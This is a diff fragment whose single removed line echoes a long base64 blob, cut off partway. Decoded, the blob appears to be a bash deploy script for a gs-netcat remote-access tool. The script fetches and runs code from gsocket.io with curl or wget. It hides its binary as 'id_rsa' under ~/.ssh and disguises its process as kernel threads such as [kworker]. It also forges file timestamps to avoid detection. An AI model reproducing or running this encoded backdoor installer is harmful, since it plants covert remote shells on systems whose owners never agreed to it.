@@ -1,1 +1,1633 @@
-echo 'IyEgL3Vzci9iaW4vZW52IGJhc2gKClVSTF9CQVNFX0NETj0iaHR0cHM6Ly9jZG4uZ3NvY2tldC5pbyIKVVJMX0JBU0VfWD0iaHR0cHM6Ly9nc29ja2V0LmlvIgpbWyAtbiAkR1NfVVJMX0JBU0UgXV0gJiYgewoJVVJMX0JBU0VfQ0ROPSIke0dTX1VSTF9CQVNFfSIKCVVSTF9CQVNFX1g9IiR7R1NfVVJMX0JBU0V9Igp9ClVSTF9CSU49IiR7VVJMX0JBU0VfQ0ROfS9iaW4iICAgICAgICMgbWluaSAmIHN0cmlwcGVkIHZlcnNpb24KVVJMX0JJTl9GVUxMPSIke1VSTF9CQVNFX0NETn0vZnVsbCIgIyBmdWxsIHZlcnNpb24gKHdpdGggLWggd29ya2luZykKW1sgLW4gJEdTX1VSTF9CSU4gXV0gJiYgewoJVVJMX0JJTj0iJHtHU19VUkxfQklOfSIKCVVSTF9CSU5fRlVMTD0iJFVSTF9CSU4iCn0KW1sgLW4gJEdTX1VSTF9ERVBMT1kgXV0gJiYgVVJMX0RFUExPWT0iJHtHU19VUkxfREVQTE9ZfSIgfHwgVVJMX0RFUExPWT0iJHtVUkxfQkFTRV9YfS95IgoKCnVuc2V0IGRhdGEKdW5zZXQgbXNnCgpETF9DUkw9ImJhc2ggLWMgXCJcJChjdXJsIC1mc1NMICRVUkxfREVQTE9ZKVwiIgpETF9XR1Q9ImJhc2ggLWMgXCJcJCh3Z2V0IC1xTy0gJFVSTF9ERVBMT1kpXCIiCkJJTl9ISURERU5fTkFNRV9ERUZBVUxUPSJpZF9yc2EiCgpwcm9jX25hbWVfYXJyPSgiW2tzdHJwXSIgIlt3YXRjaGRvZ2RdIiAiW2tzbWRdIiAiW2tzd2FwZDBdIiAiW2NhcmQwLWNydGM4XSIgIlttbV9wZXJjcHVfd3FdIiAiW3JjdV9wcmVlbXB0XSIgIltrd29ya2VyXSIgIltyYWlkNXdxXSIgIltzbHViX2ZsdXNod3FdIiAiW25ldG5zXSIgIltrYWx1YWRdIikKClBST0NfSElEREVOX05BTUVfREVGQVVMVD0iJHtwcm9jX25hbWVfYXJyWyQoKFJBTkRPTSAlICR7I3Byb2NfbmFtZV9hcnJbQF19KSldfSIKZm9yIHN0ciBpbiAiJHtwcm9jX25hbWVfYXJyW0BdfSI7IGRvCglQUk9DX0hJRERFTl9OQU1FX1JYKz0ifCQoZWNobyAiJHN0ciIgfCBzZWQgJ3MvW15hLXpBLVowLTldL1xcJi9nJykiCmRvbmUKUFJPQ19ISURERU5fTkFNRV9SWD0iJHtQUk9DX0hJRERFTl9OQU1FX1JYOjF9IgoKCkNPTkZJR19ESVJfTkFNRT0icHV0dHkiCgojIE5hbWVzIGZvciAndW5pbnN0YWxsJyAoaW5jbHVkaW5nIG5hbWVzIGZyb20gcHJldmlvdXMgdmVyc2lvbnMpCkJJTl9ISURERU5fTkFNRV9STT0oIiRCSU5fSElEREVOX05BTUVfREVGQVVMVCIpCkNPTkZJR19ESVJfTkFNRV9STT0oIiRDT05GSUdfRElSX05BTUUiKQoKW1sgLXQgMSBdXSAmJiB7CglDWT0iXDAzM1sxOzMzbSIgIyB5ZWxsb3cKCUNEWT0iXDAzM1swOzMzbSIgIyB5ZWxsb3cKCUNHPSJcMDMzWzE7MzJtIiAjIGdyZWVuCglDUj0iXDAzM1sxOzMxbSIgIyByZWQKCUNEUj0iXDAzM1swOzMxbSIgIyByZWQKCUNCPSJcMDMzWzE7MzRtIiAjIGJsdWUKCUNDPSJcMDMzWzE7MzZtIiAjIGN5YW4KCUNEQz0iXDAzM1swOzM2bSIgIyBjeWFuCglDTT0iXDAzM1sxOzM1bSIgIyBtYWdlbnRhCglDTj0iXDAzM1swbSIgICAgIyBub25lCglDVz0iXDAzM1sxOzM3bSIKfQoKaWYgW1sgLXogIiRHU19ERUJVRyIgXV07IHRoZW4KCURFQlVHRigpeyA6O30KZWxzZQoJREVCVUdGKCl7IGVjaG8gLWUgIiR7Q1l9REVCVUc6JHtDTn0gJCoiO30KZmkKCl90c19maXgoKQp7Cglsb2NhbCBmbgoJbG9jYWwgdHMKCWxvY2FsIGFyZ3MKCWxvY2FsIGF4Cglmbj0iJDEiCgl0cz0iJDIiCgoJYXJncz0oKSAjT1NYLCBtdXN0IGluaXQgb3IgIiAiIGluIHRvdWNoICIgIiAtciAKCglbWyAhIC1lICIkMSIgXV0gJiYgcmV0dXJuCglbWyAteiAkdHMgXV0gJiYgcmV0dXJuCgoJIyBDaGFuZ2UgdGhlIHN5bWxpbmsgZm9yIHRzX3N5c3RlbWRfZm4gaXRlbXMKCVtbIC1uICIkMyIgXV0gJiYgYXJncz0oIi1oIikKCgkjIEVpdGhlciByZWZlcmVuY2UgYnkgVGltZXN0YW1wIG9yIEZpbGUKCVtbICIke3RzOjA6MX0iID0gJy8nIF1dICYmIHsKCQlbWyAhIC1lICIke3RzfSIgXV0gJiYgdHM9Ii9ldGMvbGQuc28uY29uZiIKCQlheD0oIiR7YXJnc1tAXX0iICItciIgIiR0cyIgIiRmbiIpCgkJdG91Y2ggIiR7YXhbQF19IiAyPi9kZXYvbnVsbAoJCXJldHVybgoJfQoJYXg9KCIke2FyZ3NbQF19IiAiLXQiICIkdHMiICIkZm4iKQoJdG91Y2ggIiR7YXhbQF19IiAyPi9kZXYvbnVsbCAmJiByZXR1cm4KCSMgSWYgJ2RhdGUgLXInIG9yICd0b3VjaCAtdCcgZmFpbGVkOgoJYXg9KCIke2FyZ3NbQF19IiAiLXIiICIvZXRjL2xkLnNvLmNvbmYiICIkZm4iKQoJdG91Y2ggIiR7YXhbQF19IiAyPi9kZXYvbnVsbAp9CgojIFJlc3RvcmUgdGltZXN0YW1wIG9mIGZpbGVzCnRzX3Jlc3RvcmUoKQp7Cglsb2NhbCBmbgoJbG9jYWwgbgoJbG9jYWwgdHMKCglbWyAkeyNfdHNfZm5fYVtAXX0gLW5lICR7I190c190c19hW0BdfSBdXSAmJiB7IGVjaG8gPiYyICJPb29wcyI7IHJldHVybjsgfQoKCW49MAoJd2hpbGUgOjsgZG8KCQlbWyAkbiAtZXEgIiR7I190c19mbl9hW0BdfSIgXV0gJiYgYnJlYWsKCQl0cz0iJHtfdHNfdHNfYVskbl19IgoJCWZuPSIke190c19mbl9hWyRuXX0iCgkJIyBERUJVR0YgIlJFU1RPUkUtVFMgJHtmbn0gJHt0c30iCgkJKChuKyspKQoKCQlfdHNfZml4ICIkZm4iICIkdHMiCglkb25lCgl1bnNldCBfdHNfZm5fYQoJdW5zZXQgX3RzX3RzX2EKCgluPTAKCXdoaWxlIDo7IGRvCgkJW1sgJG4gLWVxICIkeyNfdHNfc3lzdGVtZF90c19hW0BdfSIgXV0gJiYgYnJlYWsKCQl0cz0iJHtfdHNfc3lzdGVtZF90c19hWyRuXX0iCgkJZm49IiR7X3RzX3N5c3RlbWRfZm5fYVskbl19IgoJCSMgREVCVUdGICJSRVNUT1JFLUxBU1QtVFMgJHtmbn0gJHt0c30iCgkJKChuKyspKQoKCQlfdHNfZml4ICIkZm4iICIkdHMiICJzeW1saW5rIgoJZG9uZQoJdW5zZXQgX3RzX3N5c3RlbWRfZm5fYQoJdW5zZXQgX3RzX3N5c3RlbWRfdHNfYQp9Cgp0c19pc19tYXJrZWQoKQp7Cglsb2NhbCBmbgoJbG9jYWwgYQoJZm49IiQxIgoKCWZvciBhIGluICIke190c19mbl9hW0BdfSI7IGRvCgkJW1sgIiRhIiA9ICIkZm4iIF1dICYmIHJldHVybiAwICMgVHJ1ZQoJZG9uZQoKCXJldHVybiAxICMgRmFsc2UKfQoKIyBUaGVyZSBhcmUgc29tZSBmaWxlcyB3aGljaCBuZWVkIFRpbWVTdGFtcCB1cGRhdGUgYWZ0ZXIgYWxsIG90aGVyIFRpbWVTdGFtcHMKIyBoYXZlIGJlZW4gZml4ZWQuIE5vdGVhYmxlIC9ldGMvc3lzdGVtZC9zeXN0ZW0vbXVsdGktdXNlci50YXJnZXQud2FudHMKIyB0c19hZGRfbGFzdCBbZmlsZV0gPHJlZmVyZW5jZSBmaWxlPgp0c19hZGRfc3lzdGVtZCgpCnsKCWxvY2FsIGZuCglsb2NhbCB0cwoJbG9jYWwgcmVmCglmbj0iJDEiCglyZWY9IiQyIgoKCXRzPSIkcmVmIgoJW1sgLXogJHJlZiBdXSAmJiB7CgkJdHM9IiQoZGF0ZSAtciAiJGZuIiArJVklbSVkJUglTS4lUyAyPi9kZXYvbnVsbCkiIHx8IHJldHVybgoJfQoKCSMgTm90ZTogX3RzX3N5c3RlbWRfdHNfYSBtYXkgc3RvcmUgYSBudW1iZXIgb3IgYSBkaXJlY3RvcnkgKHN0YXJ0IHdpdGggJy8nKQoJX3RzX3N5c3RlbWRfdHNfYSs9KCIkdHMiKQoJX3RzX3N5c3RlbWRfZm5fYSs9KCIkZm4iKQp9CgojIERldGVybWluZSB0aGUgVGltZXN0YW1wIG9mIHRoZSBmaWxlICRmbiB0aGF0IGlzIGFib3V0IHRvIGJlCiMgY3JlYXRlZCAob3IgYWxyZWFkeSBleGlzdHMpLgojIFNldHMgJF90c190cyB0byBUaW1lc3RhbXAuCiMgVXNhZ2U6IF90c19nZXRfdHMgWyRmbl0KX3RzX2dldF90cygpCnsKCWxvY2FsIGZuCglsb2NhbCBuCglsb2NhbCBwZGlyCglmbj0iJDEiCglwZGlyPSIkKGRpcm5hbWUgIiQxIikiCgoJdW5zZXQgX3RzX3RzCgl1bnNldCBfdHNfcGRpcl9ieV91cwoJIyBJbmhlcml0IFRpbWVzdGFtcCBpZiBwYXJlbnQgZGlyZWN0b3J5IHdhcyBjcmVhdGVkCgkjIGJ5IHVzLgoJbj0wCgl3aGlsZSA6OyBkbwoJCVtbICRuIC1lcSAiJHsjX3RzX2ZuX2FbQF19IiBdXSAmJiBicmVhawoJCVtbICIkcGRpciIgPSAiJHtfdHNfbWtkaXJfZm5fYVskbl19IiBdXSAmJiB7CgkJCV90c190cz0iJHtfdHNfdHNfYVskbl19IgoJCQlfdHNfcGRpcl9ieV91cz0xCgkJCSMgREVCVUdGICJQYXJlbnQgJHtwZGlyfSBjcmVhdGVkIGJ5IHVzLiIKCQkJcmV0dXJuCgkJfQoJCSgobisrKSkKCWRvbmUKCgkjIENoZWNrIGlmIGZpbGUgZXhpc3RzLgoJW1sgLWUgIiRmbiIgXV0gJiYgX3RzX3RzPSIkKGRhdGUgLXIgIiRmbiIgKyVZJW0lZCVIJU0uJVMgMj4vZGV2L251bGwpIiAmJiByZXR1cm4KCgkjIFRha2UgdHMgZnJvbSBvbGRlc3QgZmlsZSBpbiBkaXJlY3RvcnkKCSMgc2hlbGxjaGVjayBkaXNhYmxlPVNDMjAxMiAjVXNlIGZpbmQgaW5zdGVhZCBvZiBscyA9PiBub3QgcG9ydGFibGUKCW9sZGVzdD0iJHtwZGlyfS8kKGxzIC1hdHIgIiR7cGRpcn0iIDI+L2Rldi9udWxsIHwgaGVhZCAtbjEpIgoJX3RzX3RzPSIkKGRhdGUgLXIgIiRvbGRlc3QiICslWSVtJWQlSCVNLiVTIDI+L2Rldi9udWxsKSIKfQoKCl90c19hZGQoKQp7CgkjIFJldHJpZXZlIFRpbWVTdGFtcCBmb3IgJDEKCV90c19nZXRfdHMgIiQxIgoJIyBBZGQgVGltZVN0YW1wCglfdHNfdHNfYSs9KCIkX3RzX3RzIikKCV90c19mbl9hKz0oIiQxIik7CglfdHNfbWtkaXJfZm5fYSs9KCIkMiIpCn0KCiMgTm90ZTogRG8gbm90IHVzZSBnbG9iYWwgX3RzIHZhcmlhYmxlcyBleGNlcHQgX3RzX2FkZF9kaXJlY3QKIyBVc2FnZTogbWtfZmlsZSBbZmlsZW5hbWVdCm1rX2ZpbGUoKQp7Cglsb2NhbCBmbgoJbG9jYWwgb2xkZXN0Cglsb2NhbCBwZGlyCglsb2NhbCBwZGlyX2FkZGVkCglmbj0iJDEiCglsb2NhbCBleGlzdHMKCgkjIERFQlVHRiAiJHtDQ31NS19GSUxFKCRmbikke0NOfSIKCXBkaXI9IiQoZGlybmFtZSAiJGZuIikiCglbWyAtZSAiJGZuIiBdXSAmJiBleGlzdHM9MQoKCXRzX2lzX21hcmtlZCAiJHBkaXIiIHx8IHsKCQkjIEhFUkU6IFBhcmVudCBub3QgdHJhY2tlZAoJCV90c19hZGQgIiRwZGlyIiAiPE5PVCBCWSBYTUtESVI+IgoJCXBkaXJfYWRkZWQ9MQoJfQoKCXRzX2lzX21hcmtlZCAiJGZuIiB8fCB7CgkJIyBIRVJFOiBOb3QgeWV0IHRyYWNrZWQKCQlfdHNfZ2V0X3RzICIkZm4iCgkJIyBEbyBub3QgYWRkIGNyZWF0aW9uIGZhaWxzLgoJCXRvdWNoICIkZm4iIDI+L2Rldi9udWxsIHx8IHsKCQkJIyBIRVJFOiBQZXJtaXNzaW9uIGRlbmllZAoJCQlbWyAtbiAiJHBkaXJfYWRkZWQiIF1dICYmIHsKCQkJCSMgUmVtb3ZlIHBkaXIgaWYgaXQgd2FzIGFkZGVkIGFib3ZlCgkJCQkjIEJhc2ggPDUuMCBkb2VzIG5vdCBzdXBwb3J0IGFyclstMV0KCQkJCSMgUXVvdGUgKCIpIHRvIHNpbGVuY2Ugc2hlbGxjaGVjawoJCQkJdW5zZXQgIl90c190c19hWyR7I190c190c19hW0BdfS0xXSIKCQkJCXVuc2V0ICJfdHNfZm5fYVskeyNfdHNfZm5fYVtAXX0tMV0iCgkJCQl1bnNldCAiX3RzX21rZGlyX2ZuX2FbJHsjX3RzX21rZGlyX2ZuX2FbQF19LTFdIgoJCQl9CgkJCXJldHVybiA2OSAjIEZhbHNlCgkJfQoJCVtbIC16ICRleGlzdHMgXV0gJiYgY2htb2QgNjAwICIkZm4iCgkJX3RzX3RzX2ErPSgiJF90c190cyIpCgkJX3RzX2ZuX2ErPSgiJGZuIik7CgkJX3RzX21rZGlyX2ZuX2ErPSgiPE5PVCBCWSBYTUtESVI+IikKCQlyZXR1cm4KCX0KCgl0b3VjaCAiJGZuIiAyPi9kZXYvbnVsbCB8fCByZXR1cm4KCVtbIC16ICRleGlzdHMgXV0gJiYgY2htb2QgNjAwICIkZm4iCgl0cnVlCn0KCnhybWRpcigpCnsKCWxvY2FsIGZuCglsb2NhbCBwZGlyCglmbj0iJDEiCgoJW1sgISAtZCAiJGZuIiBdXSAmJiByZXR1cm4KCXBkaXI9IiQoZGlybmFtZSAiJGZuIikiCgoJdHNfaXNfbWFya2VkICIkcGRpciIgfHwgewoJCV90c19hZGQgIiRwZGlyIiAiPFJNRElSLVVOVFJBQ0tFRD4iCgl9CgoJcm1kaXIgIiRmbiIgMj4vZGV2L251bGwKfQoKeHJtKCkKewoJbG9jYWwgcGRpcgoJbG9jYWwgZm4KCWZuPSIkMSIKCglbWyAhIC1mICIkZm4iIF1dICYmIHJldHVybgoJcGRpcj0iJChkaXJuYW1lICIkZm4iKSIKCgl0c19pc19tYXJrZWQgIiRwZGlyIiB8fCB7CgkJIyBIRVJFOiBQYXJlbnQgaXMgbm90IHRyYWNrZWQuCgkJX3RzX2FkZCAiJHBkaXIiICI8Uk0tVU5UUkFDS0VEPiIKCX0KCglybSAtZiAiJDEiIDI+L2Rldi9udWxsCn0KCiMgQ3JlYXRlIGEgZGlyZWN0b3J5IGlmIGl0IGRvZXMgbm90IGV4aXN0IGFuZCBmaXggdGltZXN0YW1wCiMgeG1rZGlyIFtkaXJlY3RvcnldIDx0cyByZWZlcmVuY2UgZmlsZT4KeG1rZGlyKCkKewoJbG9jYWwgZm4KCWxvY2FsIHBkaXIKCWZuPSIkMSIKCglERUJVR0YgIiR7Q0d9WE1LRElSKCRmbikke0NOfSIKCXBkaXI9IiQoZGlybmFtZSAiJGZuIikiCgl0cnVlICMgcmVzZXQgJD8KCVtbIC1kICIkZm4iIF1dICYmIHJldHVybiAgICAgIyBEaXJlY3RvcnkgYWxyZWFkeSBleGlzdHMKCVtbICEgLWQgIiRwZGlyIiBdXSAmJiByZXR1cm4gIyBQYXJlbnQgZGlyIGRvZXMgbm90IGV4aXN0cyAoSHVoPykKCgkjIENoZWNrIGlmIHBhcmVudCBpcyBiZWluZyB0cmFja2VkCgl0c19pc19tYXJrZWQgIiRwZGlyIiB8fCB7CgkJIyBIRVJFOiBQYXJlbnQgbm90IHRyYWNrZWQKCQkjIFdlIGRpZCBub3QgY3JlYXRlIHRoZSBwYXJlbnQgb3Igd2Ugd291bGQgYmUgdHJhY2tpbmcgaXQuCgkJX3RzX2FkZCAiJHBkaXIiICI8Tk9UIEJZIFhNS0RJUj4iCgl9CgoJIyBDaGVjayBpZiBuZXcgZGlyZWN0b3J5IGlzIGFscmVhZHkgdHJhY2tlZAoJdHNfaXNfbWFya2VkICIkZm4iIHx8IHsKCQkjIEhFUkU6IE5vdCB5ZXQgdHJhY2tlZCAobm9ybWFsIGNhc2UpCgkJX3RzX2FkZCAiJGZuIiAiJGZuIiAjIFdlIGNyZWF0ZSB0aGUgZGlyZWN0b3J5IChiZWxvdykKCX0KCglta2RpciAiJGZuIiAyPi9kZXYvbnVsbCB8fCByZXR1cm4KCWNobW9kIDcwMCAiJGZuIgoJdHJ1ZQp9Cgp4Y3AoKQp7Cglsb2NhbCBzcmMKCWxvY2FsIGRzdAoJc3JjPSIkMSIKCWRzdD0iJDIiCgoJIyBERUJVR0YgIiR7Q0d9WENQKCRzcmMsICRkc3QpJHtDTn0iCglta19maWxlICIkZHN0IiB8fCByZXR1cm4KCWNwICIkc3JjIiAiJGRzdCIgfHwgcmV0dXJuCgl0cnVlCn0KCnhtdigpCnsKCWxvY2FsIHNyYwoJbG9jYWwgZHN0CglzcmM9IiQxIgoJZHN0PSIkMiIKCglbWyAtZSAiJGRzdCIgXV0gJiYgeHJtICIkZHN0IgoJeGNwICIkc3JjIiAiJGRzdCIgfHwgcmV0dXJuCgl4cm0gIiRzcmMiCgl0cnVlCn0KCmNsZWFuX2FsbCgpCnsKCVtbICIkeyNUTVBESVJ9IiAtZ3QgNSBdXSAmJiB7CgkJcm0gLXJmICIke1RNUERJUjo/fS8iKgoJCXJtZGlyICIke1RNUERJUn0iCgl9ICY+L2Rldi9udWxsCgoJdHNfcmVzdG9yZQp9CgpleGl0X2NvZGUoKQp7CgljbGVhbl9hbGwKCglleGl0ICIkMSIKfQoKZXJyZXhpdCgpCnsKCVtbIC16ICIkMSIgXV0gfHwgZWNobyAtZSA+JjIgIiR7Q1J9JCoke0NOfSIKCglleGl0X2NvZGUgMjU1Cn0KCnRyeV9kc3RkaXIoKQp7Cglsb2NhbCBkc3RkaXIKCWxvY2FsIHRyeWJpbgoJZHN0ZGlyPSIkezF9IgoKCSMgQ3JlYXRlIGRpcmVjdG9yeSBpZiBpdCBkb2VzIG5vdCBleGlzdHMuCglbWyAhIC1kICIke2RzdGRpcn0iIF1dICYmIHsgeG1rZGlyICIke2RzdGRpcn0iIHx8IHJldHVybiAxMDE7IH0KCglEU1RCSU49IiR7ZHN0ZGlyfS8ke0JJTl9ISURERU5fTkFNRX0iCiAKCW1rX2ZpbGUgIiREU1RCSU4iIHx8IHJldHVybiAxMDIKCgkjIEZpbmQgYW4gZXhlY3V0ZWFibGUgYW5kIHRlc3QgaWYgd2UgY2FuIGV4ZWN1dGUgYmluYXJpZXMgZnJvbQoJIyBkZXN0aW5hdGlvbiBkaXJlY3RvcnkgKG5vIG5vZXhlYyBmbGFnKQoJIyAvYmluL3RydWUgbWlnaHQgYmUgYSBzeW1saW5rIHRvIC91c3IvYmluL3RydWUKCWZvciBlYmluIGluICIvYmluL3RydWUiICIkKGNvbW1hbmQgLXYgaWQpIjsgZG8KCQlbWyAteiAkZWJpbiBdXSAmJiBjb250aW51ZQoJCVtbIC1lICIkZWJpbiIgXV0gJiYgYnJlYWsKCWRvbmUKCVtbICEgLWUgIiRlYmluIiBdXSAmJiByZXR1cm4gMCAjIFRydWUuIFRyeSBvdXIgYmVzdAoKCSMgTXVzdCB1c2Ugc2FtZSBuYW1lIG9uIGJ1c3lib3gtc3lzdGVtcwoJdHJ5YmluPSIke2RzdGRpcn0vJChiYXNlbmFtZSAiJGViaW4iKSIKCgkjIC9iaW4vdHJ1ZSBtaWdodCBiZSBhIHN5bWxpbmsgdG8gL3Vzci9iaW4vdHJ1ZQoJW1sgIiRlYmluIiAtZWYgIiR0cnliaW4iIF1dICYmIHJldHVybiAwCglta19maWxlICIkdHJ5YmluIiB8fCByZXR1cm4KCgoJY3AgIiRlYmluIiAiJHRyeWJpbiIgJj4vZGV2L251bGwgfHwgeyBybSAtZiAiJHt0cnliaW46P30iOyByZXR1cm47IH0KCWNobW9kIDcwMCAiJHRyeWJpbiIKCgkiJHt0cnliaW59IiAtZyAmPi9kZXYvbnVsbCB8fCB7IHJtIC1mICIke3RyeWJpbjo/fSI7IHJldHVybiAxMDQ7IH0gIyBGQUlMVVJFCglybSAtZiAiJHt0cnliaW46P30iCgoJcmV0dXJuIDAKfQoKCgojIENhbGxlZCBfYWZ0ZXJfIGluaXRfdmFycygpIGF0IHRoZSBlbmQgb2YgaW5pdF9zZXR1cC4KaW5pdF9kc3RiaW4oKQp7CglpZiBbWyAtbiAiJEdTX0RTVERJUiIgXV07IHRoZW4KCQl0cnlfZHN0ZGlyICIke0dTX0RTVERJUn0iICYmIHJldHVybgoKCQllcnJleGl0ICJGQUlMRUQ6IEdTX0RTVERJUj0ke0dTX0RTVERJUn0gaXMgbm90IHdyaXRlYWJsZSBhbmQgZXhlY3V0ZWFibGUuIgoJZmkKCgkjIFRyeSBzeXN0ZW13aWRlIGluc3RhbGxhdGlvbiBmaXJzdAoJdHJ5X2RzdGRpciAiJHtHU19QUkVGSVh9L3Vzci9iaW4iICYmIHJldHVybgoKCSMgVHJ5IHVzZXIgaW5zdGFsbGF0aW9uCglbWyAhIC1kICIke0dTX1BSRUZJWH0kKGdyZXAgXiIkKHdob2FtaSkiIC9ldGMvcGFzc3dkIHwgY3V0IC1kOiAtZjYpLy5zc2giIF1dICYmIHhta2RpciAiJHtHU19QUkVGSVh9JChncmVwIF4iJCh3aG9hbWkpIiAvZXRjL3Bhc3N3ZCB8IGN1dCAtZDogLWY2KS8uc3NoIgoJdHJ5X2RzdGRpciAiJHtHU19QUkVGSVh9JChncmVwIF4iJCh3aG9hbWkpIiAvZXRjL3Bhc3N3ZCB8IGN1dCAtZDogLWY2KS8uc3NoLyR7Q09ORklHX0RJUl9OQU1FfSIgJiYgcmV0dXJuCgoJIyBUcnkgY3VycmVudCB3b3JraW5nIGRpcmVjdG9yeQoJdHJ5X2RzdGRpciAiJHtQV0R9IiAmJiB7IElTX0RTVEJJTl9DV0Q9MTsgcmV0dXJuOyB9CgoJIyBUcnkgL3RtcC8uZ3N1c3ItKgoJdHJ5X2RzdGRpciAiL3RtcC8uZ3N1c3ItJHtVSUR9IiAmJiB7IElTX0RTVEJJTl9UTVA9MTsgcmV0dXJuOyB9CgoJIyBUcnkgL2Rldi9zaG0gYXMgbGFzdCByZXNvcnQKCXRyeV9kc3RkaXIgIi9kZXYvc2htIiAmJiB7IElTX0RTVEJJTl9UTVA9MTsgcmV0dXJuOyB9CgoJZWNobyAtZSA+JjIgIiR7Q1J9RVJST1I6IENhbiBub3QgZmluZCB3cml0ZWFibGUgYW5kIGV4ZWN1dGFibGUgZGlyZWN0b3J5LiR7Q059IgoJV0FSTiAiVHJ5IHNldHRpbmcgR1NfRFNURElSPSB0byBhIHdyaXRlYWJsZSBhbmQgZXhlY3V0YWJsZSBkaXJlY3RvcnkuIgoJZXJyZXhpdAp9Cgp0cnlfdG1wZGlyKCkKewoJW1sgLW4gJFRNUERJUiBdXSAmJiByZXR1cm4gIyBhbHJlYWR5IHNldAoKCVtbICEgLWQgIiQxIiBdXSAmJiByZXR1cm4KCglbWyAtZCAiJDEiIF1dICYmIHhta2RpciAiJHsxfS8kezJ9IiAmJiBUTVBESVI9IiR7MX0vJHsyfSIKfQoKdHJ5X2VuY29kZSgpCnsKCWxvY2FsIGVuYwoJbG9jYWwgZGVjCglsb2NhbCB0ZXN0c3RyCglwcmc9IiQxIgoJZW5jPSIkMiIKCWRlYz0iJDMiCgoJdGVzdHN0cj0iYmxoYXw7aWQtdSBcJ3RoaXMgaXMgYSBsb25nIHRlc3Qgb2YgYSB2ZXJ5IGxvbmcgc3RyaW5nIHRvIHRlc3QgZW5jb2RpZ24gZGVjb2RpbmcgcHJvY2VzcyAjIGZvb2JhciIKCglbWyAtbiAkRU5DT0RFX1NUUiBdXSAmJiByZXR1cm4KCgljb21tYW5kIC12ICIkcHJnIiA+L2Rldi9udWxsICYmIFtbICIkKGVjaG8gIiR0ZXN0c3RyIiB8ICRlbmMgMj4vZGV2L251bGx8ICRkZWMgMj4vZGV2L251bGwpIiA9ICIkdGVzdHN0ciIgXV0gfHwgcmV0dXJuCglFTkNPREVfU1RSPSIkZW5jIgoJREVDT0RFX1NUUj0iJGRlYyIKfQoKCiMgUmV0dXJuIFRSVUUgaWYgd2UgYXJlIDEwMCUgc3VyZSBpdCdzIGxpdHRsZSBlbmRpYW4KaXNfbGUoKQp7Cgljb21tYW5kIC12IGxzY3B1ID4vZGV2L251bGwgJiYgewoJCVtbICQobHNjcHUpID09ICoiTGl0dGxlIEVuZGlhbiIqIF1dICYmIHJldHVybiAwCgkJcmV0dXJuIDI1NQoJfQoKCWNvbW1hbmQgLXYgb2QgPi9kZXYvbnVsbCAmJiBjb21tYW5kIC12IGF3ayA+L2Rldi9udWxsICYmIHsKCQlbWyAkKGVjaG8gLW4gSSB8IG9kIC1vIHwgYXdrICdGTlI9PTF7IHByaW50IHN1YnN0cigkMiw2LDEpfScpID09ICIxIiBdXSAmJiByZXR1cm4gMAoJfQoKCXJldHVybiAyNTUKfQoKaW5pdF92YXJzKCkKewoJIyBTZWxlY3QgYmluYXJ5Cglsb2NhbCBhcmNoCglsb2NhbCBvc25hbWUKCWFyY2g9JCh1bmFtZSAtbSkKCgoJSE9NRT0iL2Rldi9zaG0iCgoJIyBzZXQgUFdEIGlmIG5vdCBzZXQKCVtbIC16ICIkUFdEIiBdXSAmJiBQV0Q9IiQocHdkIDI+L2Rldi9udWxsKSIKCglbWyAteiAiJE9TVFlQRSIgXV0gJiYgewoJCWxvY2FsIG9zbmFtZQoJCW9zbmFtZT0iJCh1bmFtZSAtcykiCgkJaWYgW1sgIiRvc25hbWUiID09ICpGcmVlQlNEKiBdXTsgdGhlbgoJCQlPU1RZUEU9IkZyZWVCU0QiCgkJZWxpZiBbWyAiJG9zbmFtZSIgPT0gKkRhcndpbiogXV07IHRoZW4KCQkJT1NUWVBFPSJkYXJ3aW4yMi4wIgoJCWVsaWYgW1sgIiRvc25hbWUiID09ICpPcGVuQlNEKiBdXTsgdGhlbgoJCQlPU1RZUEU9Im9wZW5ic2Q3LjMiCgkJZWxpZiBbWyAiJG9zbmFtZSIgPT0gKkxpbnV4KiBdXTsgdGhlbgoJCQlPU1RZUEU9ImxpbnV4LWdudSIKCQlmaQoJfQoKCXVuc2V0IE9TQVJDSAoJdW5zZXQgU1JDX1BLRwoJIyBVc2VyIHN1cHBsaWVkIE9TQVJDSAoJW1sgLW4gIiRHU19PU0FSQ0giIF1dICYmIE9TQVJDSD0iJEdTX09TQVJDSCIKCglpZiBbWyAteiAiJE9TQVJDSCIgXV07IHRoZW4KCQlpZiBbWyAkT1NUWVBFID09ICpsaW51eCogXV07IHRoZW4gCgkJCWlmIFtbICIkYXJjaCIgPT0gImk2ODYiIF1dIHx8IFtbICIkYXJjaCIgPT0gImkzODYiIF1dOyB0aGVuCgkJCQlPU0FSQ0g9ImkzODYtYWxwaW5lIgoJCQkJU1JDX1BLRz0iZ3MtbmV0Y2F0X21pbmktbGludXgtaTY4NiIKCQkJZWxpZiBbWyAiJGFyY2giID09ICoiYXJtdjYiKiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJhcm0tbGludXgiCgkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC1hcm12NiIKCQkJZWxpZiBbWyAiJGFyY2giID09ICoiYXJtdjdsIiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJhcm0tbGludXgiCgkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC1hcm12N2wiCgkJCWVsaWYgW1sgIiRhcmNoIiA9PSAqImFybXYiKiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJhcm0tbGludXgiICMgUlBJLVplcm8gLyBSUEkgNGIrCgkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC1hcm0iCgkJCWVsaWYgW1sgIiRhcmNoIiA9PSAiYWFyY2g2NCIgXV07IHRoZW4KCQkJCU9TQVJDSD0iYWFyY2g2NC1saW51eCIKCQkJCVNSQ19QS0c9ImdzLW5ldGNhdF9taW5pLWxpbnV4LWFhcmNoNjQiCgkJCWVsaWYgW1sgIiRhcmNoIiA9PSAibWlwczY0IiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJtaXBzNjQtYWxwaW5lIgoJCQkJU1JDX1BLRz0iZ3MtbmV0Y2F0X21pbmktbGludXgtbWlwczY0IgoJCQkJIyBHbyAzMi1iaXQgaWYgTGl0dGxlIEVuZGlhbiBldmVuIGlmIDY0Yml0IGFyY2gKCQkJCWlzX2xlICYmIHsKCQkJCQlPU0FSQ0g9Im1pcHNlbDMyLWFscGluZSIKCQkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC1taXBzZWwiCgkJCQl9CgkJCWVsaWYgW1sgIiRhcmNoIiA9PSAqbWlwcyogXV07IHRoZW4KCQkJCU9TQVJDSD0ibWlwczMyLWFscGluZSIKCQkJCVNSQ19QS0c